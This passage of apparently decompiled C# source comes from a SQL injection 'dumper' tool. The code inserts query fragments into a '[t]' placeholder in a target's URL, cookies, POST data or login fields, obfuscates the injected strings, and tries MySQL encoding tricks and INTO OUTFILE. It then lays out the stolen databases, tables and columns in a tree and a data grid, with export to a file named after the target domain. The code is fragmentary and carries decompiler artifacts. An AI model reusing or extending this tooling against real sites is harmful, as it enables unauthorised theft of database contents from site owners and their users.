            sText = this.NodeRemoveCount(sText);
            if (Versioned.IsNumeric(sCount1))
            {
                sCount1 = Strings.FormatNumber(Conversions.ToInteger(sCount1), 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
            }
            if (Versioned.IsNumeric(sCount2))
            {
                sCount2 = Strings.FormatNumber(Conversions.ToInteger(sCount2), 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
            }
            string result;
            if (string.IsNullOrEmpty(sCount2))
            {
                result = sText.PadRight(23, ' ') + "[" + sCount1.PadRight(2, ' ') + "]";
            }
            else
            {
                result = string.Concat(new string[]
		{
			sText.PadRight(23, ' '),
			"[",
			sCount1.PadRight(2, ' '),
			"#",
			sCount2.PadLeft(6, ' '),
			"]"
		});
            }
            return result;
        }
        private bool MySQLIntoOutfile(ref string sResult)
        {
            int num = Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
            Conversions.ToInteger(this.GetObjectValue(this.numSleep));
            checked
            {
                bool result = false;
                while (!this.WorkedRequestStop())
                {
                    this.UpDateStatus("Dumper thread, loading please wait.. executing the query.");
                    string text = this.__SchemaDump.Item(0).Columns[0] + " " + this.__SchemaDump.Item(0).Query;
                    HttpResponse httpResponse = null;
                    string value = this.LoadHTML(ref text, ref sResult, ref httpResponse);
                    if (string.IsNullOrEmpty(value))
                    {
                        int num2 = 0;
                        if (num2 < num)
                        {
                            num2++;
                            continue;
                        }
                        sResult = "HTTP Timeout";
                    }
                    else
                    {
                        result = true;
                    }
                    return result;
                }
                return result;
            }
        }

        private string LoadHTML(ref string sTraject, ref string sResult, ref HttpResponse oRq)
        {
            string result = "";
            int iTimeOut = Conversions.ToInteger(this.GetObjectValue(this.numTimeOut));
            string text = Conversions.ToString(this.GetObjectValue(this.txtURL));
            string text2 = Conversions.ToString(this.GetObjectValue(this.txtCookies));
            string text3 = Conversions.ToString(this.GetObjectValue(this.txtPost));
            string text4 = Conversions.ToString(this.GetObjectValue(this.txtUserName));
            string text5 = Conversions.ToString(this.GetObjectValue(this.txtPassword));
            object objectValue = this.GetObjectValue(this.cmbInjectionPoint);
            if (Operators.ConditionalCompareObjectEqual(objectValue, 0, false))
            {
                if (sTraject.IndexOf("count(") <= 0 && this.DumpWithVariousT())
                {
                    text = sTraject;
                }
                else
                {
                    //text = this.__TrajectOneT;
                    text = text.Replace("[t]", sTraject);
                }
                global::Globals.G_Tools.CheckSQLiStringOfuscation(ref text);
            }
            else if (Operators.ConditionalCompareObjectEqual(objectValue, 1, false))
            {
                text2 = text2.Replace("[t]", sTraject);
                global::Globals.G_Tools.CheckSQLiStringOfuscation(ref text2);
            }
            else if (Operators.ConditionalCompareObjectEqual(objectValue, 2, false))
            {
                text3 = text3.Replace("[t]", sTraject);
                global::Globals.G_Tools.CheckSQLiStringOfuscation(ref text3);
            }
            else if (Operators.ConditionalCompareObjectEqual(objectValue, 3, false))
            {
                text4 = text4.Replace("[t]", sTraject);
                global::Globals.G_Tools.CheckSQLiStringOfuscation(ref text4);
            }
            else if (Operators.ConditionalCompareObjectEqual(objectValue, 4, false))
            {
                text5 = text5.Replace("[t]", sTraject);
                global::Globals.G_Tools.CheckSQLiStringOfuscation(ref text5);
            }
            if (this.bckWorker.CancellationPending)
            {
                return "";
            }
            using (HTTP hTTP = new HTTP(iTimeOut, false))
            {
                Conversions.ToInteger(this.GetObjectValue(this.numMaxRetry));
                NetworkCredential oCredentials = null;
                enHTTPMethod oMethod = enHTTPMethod.GET;// (enHTTPMethod)Conversions.ToInteger(Interaction.IIf(Operators.ConditionalCompareObjectEqual(this.GetObjectValue(this.cmbMethod), 0, false), enHTTPMethod.GET, enHTTPMethod.POST));
                if (Conversions.ToBoolean(this.GetObjectValue(this.chkLogin)))
                {
                    oCredentials = new NetworkCredential(text4, text5);
                }
                this.CheckRequestDelay();
                result = hTTP.GetHTML(text, oMethod, ref text3, text2, oCredentials, true, ref sResult);
                if (hTTP.WebResponse != null)
                {
                    oRq = hTTP.WebResponse;
                }
            }
            return result;
        }

        private void CheckRequestDelay()
	    {
		    bool flag = false;
		    try
		    {
			    Monitor.Enter(this.CheckRequestDelay_LastTick_Init, ref flag);
			    if (this.CheckRequestDelay_LastTick_Init.State == 0)
			    {
				    this.CheckRequestDelay_LastTick_Init.State = 2;
				    this.CheckRequestDelay_LastTick = 1L;
			    }
			    else if (this.CheckRequestDelay_LastTick_Init.State == 2)
			    {
				    throw new IncompleteInitialization();
			    }
		    }
		    finally
		    {
			    this.CheckRequestDelay_LastTick_Init.State = 1;
			    if (flag)
			    {
				    Monitor.Exit(this.CheckRequestDelay_LastTick_Init);
			    }
		    }
		    int num = Conversions.ToInteger(this.GetObjectValue(this.numSleep));
		    if (num == 0)
		    {
			    return;
		    }
		    checked
		    {
			    while (true)
			    {
				    long num2 = (long)Math.Round((double)DateTime.UtcNow.Ticks / 10000.0);
				    if (num2 - this.CheckRequestDelay_LastTick > unchecked((long)num))
				    {
					    break;
				    }
				    Application.DoEvents();
				    Thread.Sleep(50);
			    }
			    this.CheckRequestDelay_LastTick = (long)Math.Round((double)DateTime.UtcNow.Ticks / 10000.0);
		    }
	    }

        internal void IniTree()
        {
            new List<string>();
            try
            {
                IEnumerator enumerator = this.trwSchema.Nodes.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    TreeNode treeNode = (TreeNode)enumerator.Current;
                    if (treeNode.Nodes.Count > 0)
                    {
                        treeNode.ToolTipText = "Tables Count: " + Conversions.ToString(treeNode.Nodes.Count);
                    }
                    //this.TreeNode_RemoveCheckBox(treeNode, 0);
                    try
                    {
                        IEnumerator enumerator2 = treeNode.Nodes.GetEnumerator();
                        while (enumerator2.MoveNext())
                        {
                            TreeNode treeNode2 = (TreeNode)enumerator2.Current;
                            if (treeNode2.Nodes.Count > 0)
                            {
                                treeNode2.ToolTipText = "Columns Count: " + Conversions.ToString(treeNode2.Nodes.Count);
                            }
                            //this.TreeNode_RemoveCheckBox(treeNode2, 0);
                            try
                            {
                                IEnumerator enumerator3 = treeNode2.Nodes.GetEnumerator();
                                while (enumerator3.MoveNext())
                                {
                                    TreeNode treeNode3 = (TreeNode)enumerator3.Current;
                                    try
                                    {
                                        IEnumerator enumerator4 = treeNode3.Nodes.GetEnumerator();
                                        while (enumerator4.MoveNext())
                                        {
                                            TreeNode node = (TreeNode)enumerator4.Current;
                                            //this.TreeNode_RemoveCheckBox(node, 0);
                                        }
                                    }
                                    finally
                                    {
                                    }
                                }
                            }
                            finally
                            {
                            }
                        }
                    }
                    finally
                    {
                    }
                }
                goto IL_1E5;
            }
            finally
            {
            }
        IL_181:
            int num = 0;
            if (this.CheckRepetDB(this.trwSchema.Nodes[num].Text) & this.trwSchema.Nodes[num].Nodes.Count == 0)
            {
                this.trwSchema.Nodes[num].Remove();
                goto IL_1E5;
            }
                num++;
            IL_1C6:
                int num2 = 0;
                if (num > num2)
                {
                    while (true)
                    {
                    IL_242:
                        int arg_257_0 = 0;
                        int num3 = this.trwSchema.Nodes.Count - 1;
                        for (int i = arg_257_0; i <= num3; i++)
                        {
                            if (this.CheckRepetDB(this.trwSchema.Nodes[i].Text))
                            {
                                this.trwSchema.Nodes[i].Remove();
                                goto IL_242;
                            }
                        }
                        break;
                    }
                    return;
                }
                goto IL_181;
            IL_1E5:
                int arg_1FA_0 = 0;
                num2 = this.trwSchema.Nodes.Count - 1;
                num = arg_1FA_0;
                goto IL_1C6;
        }

        private TreeNode GetNode(Schema oT, string sDB, string sTable = "", string sCollumn = "")
        {
            switch (oT)
            {
                case Schema.DATABASES:
                    try
                    {
                        IEnumerator enumerator = this.trwSchema.Nodes.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            TreeNode treeNode = (TreeNode)enumerator.Current;
                            if (Operators.CompareString(this.NodeRemoveCount(treeNode.Text), this.NodeRemoveCount(sDB), false) == 0)
                            {
                                TreeNode result = treeNode;
                                return result;
                            }
                        }
                        goto IL_275;
                    }
                    finally
                    {
                       
                    }
                    break;
                case Schema.TABLES:
                    break;
                case Schema.COLUMNS:
                    goto IL_14C;
                default:
                    goto IL_275;
            }
            try
            {
                IEnumerator enumerator2 = this.trwSchema.Nodes.GetEnumerator();
                while (enumerator2.MoveNext())
                {
                    TreeNode treeNode = (TreeNode)enumerator2.Current;
                    if (Operators.CompareString(this.NodeRemoveCount(treeNode.Text), this.NodeRemoveCount(sDB), false) == 0)
                    {
                        try
                        {
                            IEnumerator enumerator3 = treeNode.Nodes.GetEnumerator();
                            while (enumerator3.MoveNext())
                            {
                                TreeNode treeNode2 = (TreeNode)enumerator3.Current;
                                if (Operators.CompareString(this.NodeRemoveCount(treeNode2.Text), this.NodeRemoveCount(sTable), false) == 0)
                                {
                                    TreeNode result = treeNode2;
                                    return result;
                                }
                            }
                        }
                        finally
                        {
                            
                        }
                    }
                }
                goto IL_275;
            }
            finally
            {
                
            }
            
            IL_14C:
                IEnumerator enumerator4 = this.trwSchema.Nodes.GetEnumerator();
                while (enumerator4.MoveNext())
                {
                    TreeNode treeNode = (TreeNode)enumerator4.Current;
                    if (Operators.CompareString(this.NodeRemoveCount(treeNode.Text), this.NodeRemoveCount(sDB), false) == 0)
                    {
                        try
                        {
                            IEnumerator enumerator5 = treeNode.Nodes.GetEnumerator();
                            while (enumerator5.MoveNext())
                            {
                                TreeNode treeNode3 = (TreeNode)enumerator5.Current;
                                if (Operators.CompareString(this.NodeRemoveCount(treeNode3.Text), this.NodeRemoveCount(sTable), false) == 0)
                                {
                                    try
                                    {
                                        IEnumerator enumerator6 = treeNode3.Nodes.GetEnumerator();
                                        while (enumerator6.MoveNext())
                                        {
                                            TreeNode treeNode4 = (TreeNode)enumerator6.Current;
                                            if (Operators.CompareString(this.NodeRemoveCount(treeNode4.Text), this.NodeRemoveCount(sCollumn), false) == 0)
                                            {
                                                TreeNode result = treeNode4;
                                                return result;
                                            }
                                        }
                                    }
                                    finally
                                    {
                                       
                                    }
                                }
                            }
                        }
                        finally
                        {
                            
                        }
                    }
                }
        IL_275:
            return new TreeNode();
        }

        private MySQLCollactions GetMySQLCollaction()
        {
            bool flag = true;
            if (Operators.ConditionalCompareObjectEqual(true, this.GetObjectValue(this.rdbMySQLCollactions0), false))
            {
                return MySQLCollactions.None;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions1), false))
            {
                return MySQLCollactions.UnHex;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions2), false))
            {
                return MySQLCollactions.Binary;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions3), false))
            {
                return MySQLCollactions.CastAsChar;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions4), false))
            {
                return MySQLCollactions.Compress;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions5), false))
            {
                return MySQLCollactions.ConvertUtf8;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions6), false))
            {
                return MySQLCollactions.ConvertLatin1;
            }
            if (Operators.ConditionalCompareObjectEqual(flag, this.GetObjectValue(this.rdbMySQLCollactions7), false))
            {
                return MySQLCollactions.Aes_descrypt;
            }
            MySQLCollactions result = new MySQLCollactions();
            return result;
        }

        private List<string> GetDBS()
        {
            List<string> list = new List<string>();
            try
            {
                IEnumerator enumerator = this.trwSchema.Nodes.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
                    string item = this.NodeRemoveCount(Conversions.ToString(NewLateBinding.LateGet(objectValue, null, "Text", new object[0], null, null, null)));
                    if (!list.Contains(item))
                    {
                        list.Add(item);
                    }
                }
            }
            finally
            {
               
            }
            return list;
        }

        private bool CheckRepetDB(string sName)
        {
            checked
            {
                int num = 0;
                try
                {
                    IEnumerator enumerator = this.trwSchema.Nodes.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        TreeNode treeNode = (TreeNode)enumerator.Current;
                        if (this.NodeRemoveCount(treeNode.Text).Equals(this.NodeRemoveCount(sName)))
                        {
                            num++;
                        }
                    }
                }
                finally
                {
                }
                return num > 1;
            }
        }

        internal void AddDataBase(string sName)
        {
            if (this.trwSchema.InvokeRequired)
            {
                this.trwSchema.Invoke(new DString(this.AddDataBase), new object[]
			    {
				    sName
			    });
            }
            else
            {
                sName = this.NodeFormatCount(sName, "?", "");
               // this.AddNode(this.trwSchema.Nodes, sName, 0);
                //this.TreeNode_RemoveCheckBox(this.trwSchema.Nodes[sName], 0);
                if (Conversions.ToBoolean(this.GetObjectValue(this.chkAutoScrollTree)) && this.trwSchema.Nodes.Count > 0)
                {
                    this.trwSchema.Nodes[checked(this.trwSchema.Nodes.Count - 1)].EnsureVisible();
                }
            }
        }

        internal void AddTable(string sDataBase, string sName)
        {
            if (this.trwSchema.InvokeRequired)
            {
                this.trwSchema.Invoke(new DString2(this.AddTable), new object[]
			    {
				    sDataBase,
				    sName
			    });
            }
            else
            {
                TreeNode node = this.GetNode(Schema.DATABASES, sDataBase, "", "");
                sName = this.NodeFormatCount(sName, "?", "?");
                this.AddNode(node, sName, 1);
               // this.TreeNode_RemoveCheckBox(node.Nodes[sName], 0);
                if (Conversions.ToBoolean(this.GetObjectValue(this.chkAutoScrollTree)) && node.Nodes.Count > 0)
                {
                    node.Nodes[checked(node.Nodes.Count - 1)].EnsureVisible();
                }
            }
        }

        private void AddColumn(string sDataBase, string sTable, string sName)
        {
            if (this.trwSchema.InvokeRequired)
            {
                this.trwSchema.Invoke(new DString3(this.AddColumn), new object[]
			    {
				    sDataBase,
				    sTable,
				    sName
			    });
            }
            else
            {
                TreeNode node = this.GetNode(Schema.TABLES, sDataBase, sTable, "");
                if (sName.Contains(":"))
                {
                    string[] array = sName.Split(new char[]
				{
					':'
				});
                    this.AddNode(node, array[0], 2);
                    this.AddColumnType(sDataBase, sTable, array[0], array[1]);
                }
                else
                {
                    this.AddNode(node, sName, 2);
                }
                if (Conversions.ToBoolean(this.GetObjectValue(this.chkAutoScrollTree)) && node.Nodes.Count > 0)
                {
                    node.Nodes[checked(node.Nodes.Count - 1)].EnsureVisible();
                }
            }
        }

        private void AddColumnType(string sDataBase, string sTable, string sColumn, string sType)
        {
            if (this.trwSchema.InvokeRequired)
            {
                this.trwSchema.Invoke(new DString4(this.AddColumnType), new object[]
			    {
				    sDataBase,
				    sTable,
				    sColumn,
				    sType
			    });
            }
            else
            {
                TreeNode node = this.GetNode(Schema.COLUMNS, sDataBase, sTable, sColumn);
                if (!string.IsNullOrEmpty(sType))
                {
                    if (node.Nodes.Count > 0)
                    {
                        node.Nodes[0].Text = sType;
                    }
                    else
                    {
                        node.Nodes.Add(sType, sType, 3).SelectedImageIndex = 3;
                    }
                    //this.TreeNode_RemoveCheckBox(node.Nodes[sType], 0);
                }
                else
                {
                    node.Nodes.Clear();
                }
            }
        }

    }

    [DesignerGenerated]
    public class frmDumpGrid
    {
	    private delegate void DLBuildColumns();
	    private delegate string DLAdd(List<string> lValues);
	    private delegate bool DLUpdate(string sID, int iColumn, string sValue);
	    private delegate string DRowIsEmpty(string sID);
	    private IContainer components;

	    [AccessedThroughProperty("mnuListView")]
	    private ContextMenuStrip _mnuListView;

	    [AccessedThroughProperty("mnuClipboard")]
	    private ToolStripMenuItem _mnuClipboard;

	    [AccessedThroughProperty("mnuClipboardAll")]
	    private ToolStripMenuItem _mnuClipboardAll;

	    [AccessedThroughProperty("mnuNewWindowsSP")]
	    private ToolStripSeparator _mnuNewWindowsSP;

	    [AccessedThroughProperty("munClipboardCell")]
	    private ToolStripMenuItem _munClipboardCell;

	    [AccessedThroughProperty("dtgData")]
	    private DataGridView _dtgData;

	    [AccessedThroughProperty("ToolStrip5")]
	    private ToolStrip _ToolStrip5;

	    [AccessedThroughProperty("btnFullView")]
	    private ToolStripButton _btnFullView;

	    [AccessedThroughProperty("ToolStripSeparator12")]
	    private ToolStripSeparator _ToolStripSeparator12;

	    [AccessedThroughProperty("btnExpTXT")]
	    private ToolStripButton _btnExpTXT;

	    [AccessedThroughProperty("ToolStripSeparator1")]
	    private ToolStripSeparator _ToolStripSeparator1;

	    [AccessedThroughProperty("btnClipboard")]
	    private ToolStripButton _btnClipboard;

	    [AccessedThroughProperty("btnCloseGrid")]
	    private ToolStripButton _btnCloseGrid;

	    [AccessedThroughProperty("ToolStripSeparator15")]
	    private ToolStripSeparator _ToolStripSeparator15;

	    [AccessedThroughProperty("btnCloseAllGrids")]
	    private ToolStripButton _btnCloseAllGrids;

	    [AccessedThroughProperty("btnCloseAllButThis")]
	    private ToolStripButton _btnCloseAllButThis;

	    [AccessedThroughProperty("ToolStripSeparator3")]
	    private ToolStripSeparator _ToolStripSeparator3;

	    [AccessedThroughProperty("ID")]
	    private DataGridViewTextBoxColumn _ID;

	    [AccessedThroughProperty("ToolStripSeparator4")]
	    private ToolStripSeparator _ToolStripSeparator4;

	    [AccessedThroughProperty("btnAutoScroll")]
	    private ToolStripButton _btnAutoScroll;

	    [CompilerGenerated]
	    private string _DataBase;

	    [CompilerGenerated]
	    private string _Table;

	    [CompilerGenerated]
	    private List<string> _Columns;

        public frmDumpGrid()
        {

            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmDumpGrid));
            this.mnuListView = new ContextMenuStrip(this.components);
            this.mnuClipboard = new ToolStripMenuItem();
            this.mnuClipboardAll = new ToolStripMenuItem();
            this.mnuNewWindowsSP = new ToolStripSeparator();
            this.munClipboardCell = new ToolStripMenuItem();
            this.dtgData = new DataGridView();
            this.ID = new DataGridViewTextBoxColumn();
            this.ToolStrip5 = new ToolStrip();
            this.btnFullView = new ToolStripButton();
            this.ToolStripSeparator12 = new ToolStripSeparator();
            this.btnExpTXT = new ToolStripButton();
            this.ToolStripSeparator1 = new ToolStripSeparator();
            this.btnClipboard = new ToolStripButton();
            this.btnCloseGrid = new ToolStripButton();
            this.ToolStripSeparator15 = new ToolStripSeparator();
            this.btnCloseAllButThis = new ToolStripButton();
            this.ToolStripSeparator3 = new ToolStripSeparator();
            this.btnCloseAllGrids = new ToolStripButton();
            this.ToolStripSeparator4 = new ToolStripSeparator();
            this.btnAutoScroll = new ToolStripButton();

            this.dtgData.AllowDrop = false;
            this.dtgData.AllowUserToAddRows = false;
            this.dtgData.BorderStyle = BorderStyle.Fixed3D;
            this.dtgData.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
            this.dtgData.AllowUserToResizeRows = false;
            this.dtgData.SelectionMode = DataGridViewSelectionMode.CellSelect;
            this.dtgData.ShowCellErrors = false;
            this.dtgData.ShowRowErrors = false;
            this.btnFullView.Tag = this;
            this.btnCloseAllGrids.Tag = this;
            this.btnCloseAllButThis.Tag = this;
            this.btnCloseGrid.Tag = this;
        }
        
	    internal virtual ContextMenuStrip mnuListView
	    {
		    get
		    {
			    return this._mnuListView;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    CancelEventHandler value2 = new CancelEventHandler(this.mnuListView_Opening);
			    if (this._mnuListView != null)
			    {
				    this._mnuListView.Opening -= value2;
			    }
			    this._mnuListView = value;
			    if (this._mnuListView != null)
			    {
				    this._mnuListView.Opening += value2;
			    }
		    }
	    }

	    internal virtual ToolStripMenuItem mnuClipboard
	    {
		    get
		    {
			    return this._mnuClipboard;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._mnuClipboard = value;
		    }
	    }

	    internal virtual ToolStripMenuItem mnuClipboardAll
	    {
		    get
		    {
			    return this._mnuClipboardAll;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._mnuClipboardAll = value;
		    }
	    }

	    internal virtual ToolStripSeparator mnuNewWindowsSP
	    {
		    get
		    {
			    return this._mnuNewWindowsSP;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._mnuNewWindowsSP = value;
		    }
	    }

	    internal virtual ToolStripMenuItem munClipboardCell
	    {
		    get
		    {
			    return this._munClipboardCell;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._munClipboardCell = value;
		    }
	    }
        DataGridView dtgData = new DataGridView();

	    internal virtual ToolStrip ToolStrip5
	    {
		    get
		    {
			    return this._ToolStrip5;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStrip5 = value;
		    }
	    }

	    public virtual ToolStripButton btnFullView
	    {
		    get
		    {
			    return this._btnFullView;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._btnFullView = value;
		    }
	    }

	    internal virtual ToolStripSeparator ToolStripSeparator12
	    {
		    get
		    {
			    return this._ToolStripSeparator12;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStripSeparator12 = value;
		    }
	    }

	    internal virtual ToolStripButton btnExpTXT
	    {
		    get
		    {
			    return this._btnExpTXT;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    EventHandler value2 = new EventHandler(this.btnExpTXT_Click);
			    if (this._btnExpTXT != null)
			    {
				    this._btnExpTXT.Click -= value2;
			    }
			    this._btnExpTXT = value;
			    if (this._btnExpTXT != null)
			    {
				    this._btnExpTXT.Click += value2;
			    }
		    }
	    }

	    internal virtual ToolStripSeparator ToolStripSeparator1
	    {
		    get
		    {
			    return this._ToolStripSeparator1;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStripSeparator1 = value;
		    }
	    }

	    internal virtual ToolStripButton btnClipboard
	    {
		    get
		    {
			    return this._btnClipboard;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    EventHandler value2 = new EventHandler(this.btnClipboard_Click);
			    if (this._btnClipboard != null)
			    {
				    this._btnClipboard.Click -= value2;
			    }
			    this._btnClipboard = value;
			    if (this._btnClipboard != null)
			    {
				    this._btnClipboard.Click += value2;
			    }
		    }
	    }

	    public virtual ToolStripButton btnCloseGrid
	    {
		    get
		    {
			    return this._btnCloseGrid;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._btnCloseGrid = value;
		    }
	    }

	    internal virtual ToolStripSeparator ToolStripSeparator15
	    {
		    get
		    {
			    return this._ToolStripSeparator15;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStripSeparator15 = value;
		    }
	    }

	    public virtual ToolStripButton btnCloseAllGrids
	    {
		    get
		    {
			    return this._btnCloseAllGrids;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._btnCloseAllGrids = value;
		    }
	    }

	    public virtual ToolStripButton btnCloseAllButThis
	    {
		    get
		    {
			    return this._btnCloseAllButThis;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._btnCloseAllButThis = value;
		    }
	    }

	    internal virtual ToolStripSeparator ToolStripSeparator3
	    {
		    get
		    {
			    return this._ToolStripSeparator3;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStripSeparator3 = value;
		    }
	    }

	    internal virtual DataGridViewTextBoxColumn ID
	    {
		    get
		    {
			    return this._ID;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ID = value;
		    }
	    }

	    internal virtual ToolStripSeparator ToolStripSeparator4
	    {
		    get
		    {
			    return this._ToolStripSeparator4;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._ToolStripSeparator4 = value;
		    }
	    }

	    internal virtual ToolStripButton btnAutoScroll
	    {
		    get
		    {
			    return this._btnAutoScroll;
		    }
		    [MethodImpl(MethodImplOptions.Synchronized)]
		    set
		    {
			    this._btnAutoScroll = value;
		    }
	    }

	    internal string DataBase
	    {
		    get
		    {
			    return this._DataBase;
		    }
		    set
		    {
			    this._DataBase = value;
		    }
	    }

	    internal string Table
	    {
		    get
		    {
			    return this._Table;
		    }
		    set
		    {
			    this._Table = value;
		    }
	    }

	    internal List<string> Columns
	    {
		    get
		    {
			    return this._Columns;
		    }
		    set
		    {
			    this._Columns = value;
		    }
	    }

	    internal void BuildColumns()
	    {
		    if (this.dtgData.InvokeRequired)
		    {
			    this.dtgData.Invoke(new frmDumpGrid.DLBuildColumns(this.BuildColumns));
		    }
		    else
		    {
			    try
			    {
				    List<string>.Enumerator enumerator = this.Columns.GetEnumerator();
				    while (enumerator.MoveNext())
				    {
					    string current = enumerator.Current;
					    DataGridViewTextBoxColumn dataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
					    dataGridViewTextBoxColumn.HeaderText = current;
					    this.dtgData.Columns.Add(dataGridViewTextBoxColumn);
				    }
			    }
			    finally
			    {
			    }
		    }
	    }

	    internal string Add(List<string> lValues)
	    {
		    /*if (this.InvokeRequired)
		    {
			    return Conversions.ToString(this.Invoke(new frmDumpGrid.DLAdd(this.Add), new object[]
			    {
				    lValues
			    }));
		    }*/
		    checked
		    {
			    object[] array = new object[lValues.Count + 1];
			    array[0] = Guid.NewGuid().ToString();
			    int arg_60_0 = 0;
			    int num = lValues.Count - 1;
			    for (int i = arg_60_0; i <= num; i++)
			    {
				    array[i + 1] = lValues[i];
			    }
			    this.dtgData.Rows.Add(array);
			    if (this.dtgData.Rows.Count > 2 & this.btnAutoScroll.Checked)
			    {
				    try
				    {
					    this.dtgData.FirstDisplayedScrollingRowIndex = this.dtgData.Rows.Count - 1;
				    }
				    catch (Exception expr_CA)
				    {
					    ProjectData.SetProjectError(expr_CA);
					    ProjectData.ClearProjectError();
				    }
			    }
			    return Conversions.ToString(array[0]);
		    }
	    }

	    internal bool RowIsEmpty(string sID)
	    {
		    /*if (this.InvokeRequired)
		    {
			    return Conversions.ToBoolean(this.Invoke(new frmDumpGrid.DRowIsEmpty((string a0) => Conversions.ToString(this.RowIsEmpty(a0))), new object[]
			    {
				    sID
			    }));
		    }*/
		    checked
		    {
			    int num = this.dtgData.Rows.Count - 1;
			    if (num <= 0)
			    {
				    return false;
			    }
			    DataGridViewRow dataGridViewRow;
			    while (true)
			    {
				    dataGridViewRow = this.dtgData.Rows[num];
				    if (dataGridViewRow.Cells["ID"].Value.ToString().Equals(sID))
				    {
					    break;
				    }
				    num--;
				    if (num < 0)
				    {
					    bool result = false;
					    return result;
				    }
			    }
			    int arg_98_0 = 1;
			    int num2 = dataGridViewRow.Cells.Count - 1;
			    bool flag = false;
			    for (int i = arg_98_0; i <= num2; i++)
			    {
				    if (i == 1)
				    {
					    flag = string.IsNullOrEmpty(dataGridViewRow.Cells[i].Value.ToString().Trim());
				    }
				    else
				    {
					    flag &= string.IsNullOrEmpty(dataGridViewRow.Cells[i].Value.ToString().Trim());
				    }
			    }
			    return flag;
		    }
	    }

	    internal bool Update(string sID, int iColumn, string sValue)
	    {
		    /*if (this.InvokeRequired)
		    {
			    return Conversions.ToBoolean(this.Invoke(new frmDumpGrid.DLUpdate(this.Update), new object[]
			    {
				    sID,
				    iColumn,
				    sValue
			    }));
		    }*/
		    checked
		    {
			    int num = this.dtgData.Rows.Count - 1;
			    DataGridViewRow dataGridViewRow;
			    while (true)
			    {
				    dataGridViewRow = this.dtgData.Rows[num];
				    if (dataGridViewRow.Cells["ID"].Value.ToString().Equals(sID))
				    {
					    break;
				    }
				    num--;
				    if (num < 0)
				    {
					    bool result = false;
					    return result;
				    }
			    }
			    dataGridViewRow.Cells[iColumn + 1].Value = sValue;
			    return true;
		    }
	    }

	    [MethodImpl(MethodImplOptions.NoOptimization)]
	    internal void btnExpTXT_Click(object sender, EventArgs e)
	    {
		    /*checked
		    {
			    try
			    {
				    if (this.dtgData.Columns.Count != 0)
				    {
					    this.__Exporter = new frmDumpGridExporter(this.dtgData, string.Concat(new string[]
					    {
						    Globals.G_Utilities.GetDomain(Globals.G_Dumper.txtURL.Text),
						    " - ",
						    this.DataBase,
						    ".",
						    this.Table,
						    ".txt"
					    }), Globals.G_Dumper.txtURL.Text);
					    this.__Exporter.Text = this.Text;
					    this.__Exporter.StartPosition = FormStartPosition.Manual;
					    this.__Exporter.Top = (int)Math.Round(unchecked((double)Globals.G_Main.Top + (double)Globals.G_Main.Height / 2.0 - (double)this.__Exporter.Height / 2.0));
					    this.__Exporter.Left = (int)Math.Round(unchecked((double)Globals.G_Main.Left + (double)Globals.G_Main.Width / 2.0 - (double)this.__Exporter.Width / 2.0));
					    this.__Exporter.Show(Globals.G_Main);
				    }
			    }
			    catch (Exception expr_14C)
			    {
				    ProjectData.SetProjectError(expr_14C);
				    Exception ex = expr_14C;
				    ProjectData.ClearProjectError();
			    }
		    }*/
	    }

	    private void mnuListView_Opening(object sender, CancelEventArgs e)
	    {
		    e.Cancel = (this.dtgData.RowCount == 0);
	    }

	    [MethodImpl(MethodImplOptions.NoOptimization)]
	    private void btnClipboard_Click(object sender, EventArgs e)
	    {
		    checked
		    {
			    try
			    {
				    string text = "";
				    int arg_1A_0 = 0;
				    int num = this.dtgData.SelectedCells.Count - 1;
				    for (int i = arg_1A_0; i <= num; i++)
				    {
					    DataGridViewCell dataGridViewCell = this.dtgData.SelectedCells[i];
					    if (i == 0)
					    {
						    text = dataGridViewCell.Value.ToString();
					    }
					    else
					    {
						    text = text + "\r\n" + dataGridViewCell.Value.ToString();
					    }
				    }
				    if (!string.IsNullOrEmpty(text))
				    {
					    Clipboard.SetText(text);
				    }
			    }
			    catch (Exception expr_76)
			    {
				    ProjectData.SetProjectError(expr_76);
				    Exception ex = expr_76;
